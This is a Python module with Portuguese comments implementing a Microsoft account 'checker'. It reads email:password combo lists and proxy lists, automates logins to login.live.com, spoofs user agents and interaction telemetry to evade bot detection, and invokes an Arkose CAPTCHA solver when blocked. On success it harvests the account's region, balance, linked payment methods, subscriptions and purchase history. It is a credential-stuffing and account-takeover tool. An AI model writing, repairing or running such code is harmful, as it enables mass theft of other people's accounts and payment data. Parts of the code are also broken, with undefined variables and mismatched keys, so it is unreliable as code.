import re
import random
import httpx
import asyncio
import logging
import json
from typing import List, Tuple, Optional
from .constants import USER_AGENTS, Microsoft
from .captcha_solver import solve_arkose_captcha
from .models import Account, LoginStatus, LoginResult

# Configuração de Logging Silenciosa para Performance, mas com registro de erros
logging.basicConfig(
    level=logging.ERROR,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler("errors.log", encoding="utf-8")]
)

class MicrosoftChecker:
    def __init__(self, max_connections: int = 50, proxy: Optional[str] = None):
        # Configurações otimizadas para VPN e alta concorrência
        limits = httpx.Limits(
            max_keepalive_connections=max_connections, 
            max_connections=max_connections,
            keepalive_expiry=30.0
        )
        self.client = httpx.AsyncClient(
            follow_redirects=True, 
            timeout=httpx.Timeout(30.0, connect=15.0, read=20.0),
            limits=limits,
            verify=False, # Ignora erros de SSL comuns em VPNs
            proxy=proxy if proxy else None,
            http2=True    # Melhora performance em conexões modernas
        )

    async def close(self):
        await self.client.aclose()

    async def __aenter__(self):
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.close()

    def _extract_data(self, html: str) -> dict:
        """Extração avançada de tokens e telemetria do ServerData."""
        data = {
            "ppft": "",
            "url_post": Microsoft.POST_LOGIN_URL,
            "uaid": "",
            "hpgid": "33",
            "hpgact": "",
            "canary": ""
        }
        
        # Extração de PPFT (múltiplos padrões)
        ppft_match = re.search(r'name="PPFT".*?value="([^"]+)"', html) or \
                     re.search(r'sFT":"([^"]+)"', html) or \
                     re.search(r'value="([^"]+)"[^>]*name="PPFT"', html)
        if ppft_match:
            data["ppft"] = ppft_match.group(1)

        # Extração de URL Post
        url_post_match = re.search(r'urlPost":"([^"]+)"', html)
        if url_post_match:
            data["url_post"] = url_post_match.group(1).replace("\\u003a", ":").replace("\\u002f", "/")

        # Extração de UAID
        uaid_match = re.search(r'uaid=([^&"]+)', html) or re.search(r'"uaid":"([^"]+)"', html)
        if uaid_match:
            data["uaid"] = uaid_match.group(1)

        # Extração de Telemetria (hpgid, hpgact, canary)
        hpgid_match = re.search(r'"hpgid":(\d+)', html)
        if hpgid_match: data["hpgid"] = hpgid_match.group(1)
        
        hpgact_match = re.search(r'"hpgact":(\d+)', html)
        if hpgact_match: data["hpgact"] = hpgact_match.group(1)
        
        canary_match = re.search(r'"canary":"([^"]+)"', html)
        if canary_match: data["canary"] = canary_match.group(1)

        return data

    async def _safe_request(self, method: str, url: str, **kwargs) -> Optional[httpx.Response]:
        """Executa requisições com retry inteligente para instabilidades de VPN."""
        for attempt in range(3): # 3 tentativas para garantir estabilidade
            try:
                return await self.client.request(method, url, **kwargs)
            except (httpx.RequestError, httpx.TimeoutException):
                if attempt < 2:
                    await asyncio.sleep(random.uniform(0.5, 1.5))
                continue
            except Exception:
                break
        return None

    async def _get_account_data(self, user_agent: str) -> Tuple[str, str, List[str]]:
        """Captura Região, Saldo e Jogos em uma única lógica paralela."""
        region, balance, games = "N/A", "N/A", []
        
        headers = Microsoft.Headers.GET_JSON.copy()
        headers["User-Agent"] = user_agent

        # 1. Busca Região e Saldo (Endpoints leves)
        tasks = [
            self._safe_request("GET", Microsoft.GET_PERSONAL_INFO, headers=headers),
            self._safe_request("GET", Microsoft.GET_PAYMENT_INSTRUMENTS, headers=headers)
        ]
        responses = await asyncio.gather(*tasks)

        # Processa Região
        if responses[0] and responses[0].status_code == 200:
            try:
                data = responses[0].json()
                region = data.get('countryRegion') or data.get('country') or "N/A"
            except: pass

        # Processa Saldo e Métodos de Pagamento
        if responses[1] and responses[1].status_code == 200:
            try:
                data = responses[1].json()
                instruments = data.get('paymentInstruments', [])
                
                # Extração de Saldo Microsoft
                balances = [f"{i.get('details',{}).get('balance','0')} {i.get('details',{}).get('currency','')}" 
                            for i in instruments if i.get('type') == 'MicrosoftBalance']
                balance = ", ".join(balances) if balances else "0.00"
                
                # Extração de outros métodos de pagamento (Cartões, PayPal, etc)
                other_methods = [f"{i.get('displayName')} ({i.get('type')})" 
                                 for i in instruments if i.get('type') != 'MicrosoftBalance']
                if other_methods:
                    balance += f" | Métodos: {', '.join(other_methods)}"
            except: pass

        # 2. Busca Assinaturas (Xbox Game Pass, Office, etc.)
        resp_subs = await self._safe_request("GET", "https://account.microsoft.com/services", headers=headers)
        if resp_subs and resp_subs.status_code == 200:
            try:
                html = resp_subs.text
                subs = re.findall(r'data-bi-name="([^"]*subscription[^"]*)"', html, re.I)
                if subs:
                    games.extend([s.replace("subscription-", "").title() for s in subs])
            except: pass

        # 3. Busca Jogos e Produtos (Endpoint mais pesado)
        params = {"period": "AllTime", "orderTypeFilter": "All", "isInD365Orders": "true", "isPiDetailsRequired": "true"}
        resp_games = await self._safe_request("GET", Microsoft.GET_ORDERS, headers=headers, params=params)
        if resp_games and resp_games.status_code == 200:
            try:
                data = resp_games.json()
                for order in data.get('orders', []):
                    p_methods = [f"{pi.get('displayName')} ({pi.get('type')})" for pi in order.get('paymentInstrumentDetails', [])]
                    p_str = ", ".join(p_methods) if p_methods else "N/A"
                    for item in order.get('items', []):
                        name = item.get('productName')
                        price = item.get('price', 'N/A')
                        if name: games.append(f"{name} ({price}) [{p_str}]")
            except: pass
        
        return str(region), str(balance), list(set([g for g in games if g]))[:15]

    async def check_account(self, account: Account) -> LoginResult:
        ua = random.choice(USER_AGENTS)
        res = LoginResult(status=LoginStatus.SESSAO_BLOQUEADA, email=account.email, password=account.password)
        
        try:
            # Passo 1: Handshake Inicial
            resp = await self._safe_request("GET", "https://login.live.com/", headers={"User-Agent": ua})
            if not resp: 
                res.status = LoginStatus.ERRO_REDE
                return res
            
            ext = self._extract_data(resp.text)
            if not ext["ppft"]: return res

            # Simulação de tempo de interação (i13) para bypass de telemetria
            # Removido o delay para maximizar a velocidade, conforme solicitado
            interaction_time = random.randint(100, 500) # Mantém o valor de telemetria baixo para simular             # Passo 2: POST com o e-mail para obter o próximo formulário (ou erro)
            payload_email = {
                "login": account.email,
                "PPFT": ext["PPFT"],
                "uaid": ext["uaid"],
                "ps": "2",
                "i13": "5000", # Simulação de tempo de digitação
                "i19": "2000", # Simulação de tempo de renderização
                "type": "11",
                "LoginOptions": "3"
            }
            
            # Headers para o POST de e-mail (mais limpos)
            post_headers = {
                **headers,
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": ext["url_post"],
                "Origin": "https://login.live.com"
            }
            
            resp = await self._safe_request("POST", ext["url_post"], headers=post_headers, data=payload_email)
            if not resp or resp.status_code != 200:
                res.error_message = f"Erro no POST de e-mail: Status {resp.status_code if resp else 'N/A'}"
                return res
            
            html = resp.text
            ext = self._extract_data(html)
            
            # Se a resposta for um erro de credenciais, já paramos aqui
            if "erro de credenciais" in html.lower() or "incorrect password" in html.lower():
                res.status = LoginStatus.ERRO_CREDENCIAIS
                return res
            
            # Passo 3: POST com a senha
            payload_senha = {
                "passwd": account.password,
                "PPFT": ext.get("PPFT", payload_email["PPFT"]), # PPFT pode ter mudado
                "uaid": ext.get("uaid", payload_email["uaid"]), # uaid pode ter mudado
                "i13": str(random.randint(100, 500)), # Telemetria de tempo de interação
                "i19": str(random.randint(100, 500)), # Telemetria de renderização
                "type": "11",
                "LoginOptions": "3"
            }
            
            # Headers para o POST de senha (reutiliza os headers do e-mail)
            resp = await self._safe_request("POST", ext["url_post"], headers=post_headers, data=payload_senha)
            if not resp or resp.status_code != 200:
                res.error_message = f"Erro no POST de senha: Status {resp.status_code if resp else 'N/A'}"
                return res
            
            html = resp.text
            ext = self._extract_data(html)
            
            if any(msg in html.lower() for msg in ["incorrect account or password", "a conta ou a senha está incorreta", "senha incorreta"]):
                res.status = LoginStatus.ERRO_CREDENCIAIS
                return res
            
            if any(msg in html for msg in ["JavaScript required", "tried to sign in too many times", "ajude-nos a proteger"]):
                
                # Tenta resolver o CAPTCHA se for detectado um bloqueio
                captcha_token = await solve_arkose_captcha(self.client)
                
                if captcha_token:
                    logging.info(f"CAPTCHA resolvido para {account.email}. Tentando re-submissão...")
                    
                    # Prepara o payload de re-submissão com o token do Arkose
                    payload["arkoseToken"] = captcha_token
                    # Algumas versões do fluxo usam 'fc_token' ou enviam no campo 'arkose'
                    payload["arkose"] = captcha_token 
                    
                    # Tenta o POST novamente com o token de solução
                    resp = await self._safe_request("POST", ext["url_post"], headers=headers, data=payload)
                    
                    if resp and resp.status_code == 200:
                        html = resp.text
                        if "ppsecure" not in html.lower() and "login" not in html.lower():
                            # Se não fomos redirecionados de volta para o login, provavelmente logamos!
                            res.status = LoginStatus.LOGADO
                            res.region, res.balance, res.games = await self._get_account_data(ua)
                            return res
                
                res.status = LoginStatus.SESSAO_BLOQUEADA
                return res

            # Passo 3: Sucesso - Captura de Dados
            res.status = LoginStatus.LOGADO
            res.region, res.balance, res.games = await self._get_account_data(ua)
            return res

        except Exception as e:
            res.error_message = str(e)
            return res

class AccountLoader:
    @staticmethod
    def load(file_path: str) -> List[Account]:
        accounts = []
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if not line or ":" not in line:
                        continue
                    try:
                        u, p = line.split(':', 1)
                        accounts.append(Account(u.strip(), p.strip()))
                    except ValueError:
                        continue
        except Exception as e:
            logging.error(f"Erro ao carregar arquivo: {e}")
        return accounts

class ProxyLoader:
    @staticmethod
    def load(path: str = "proxies.txt") -> List[str]:
        proxies = []
        try:
            with open(path, "r", encoding="utf-8") as f:
                for line in f:
                    proxy = line.strip()
                    if proxy:
                        if not proxy.startswith(("http://", "https://", "socks5://")):
                            proxy = f"http://{proxy}"
                        proxies.append(proxy)
        except FileNotFoundError:
            pass
        except Exception as e:
            logging.error(f"Erro ao carregar proxies: {e}")
        return proxies
